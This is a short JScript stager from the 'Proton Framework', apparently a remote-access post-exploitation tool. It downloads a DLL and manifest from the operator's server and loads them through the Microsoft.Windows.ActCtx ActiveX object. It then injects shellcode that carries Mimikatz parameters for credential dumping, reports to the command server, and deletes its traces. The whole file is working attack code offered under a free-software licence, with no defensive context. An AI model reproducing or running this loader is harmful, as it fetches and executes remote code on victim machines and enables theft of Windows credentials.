//            ---------------------------------------------------
//                             Proton Framework              
//            ---------------------------------------------------
//                Copyright (C) <2019-2020>  <Entynetproject>
//
//        This program is free software: you can redistribute it and/or modify
//        it under the terms of the GNU General Public License as published by
//        the Free Software Foundation, either version 3 of the License, or
//        any later version.
//
//        This program is distributed in the hope that it will be useful,
//        but WITHOUT ANY WARRANTY; without even the implied warranty of
//        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//        GNU General Public License for more details.
//
//        You should have received a copy of the GNU General Public License
//        along with this program.  If not, see <http://www.gnu.org/licenses/>.

try
{
    var manifestPath = proton.file.getPath("~DIRECTORY~\\TashLib.manifest");
    proton.http.download(manifestPath, "~MANIFESTUUID~");

    proton.http.download("~DIRECTORY~\\TashLib.dll", "~DLLUUID~");

    var actCtx = new ActiveXObject( "Microsoft.Windows.ActCtx" );
    actCtx.Manifest = manifestPath;
    var tash =  actCtx.CreateObject("TashLib.TashLoader");

    var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + proton.work.make_url();

    // TSC = "\x..."
    ~SHIMX86BYTES~

    var res = tash.Load(TSC, shim_lpParam, ~SHIMX86OFFSET~);

    proton.work.report("Success");
}
catch (e)
{
    proton.work.error(e);
}

proton.file.deleteFile(manifestPath);
proton.exit();
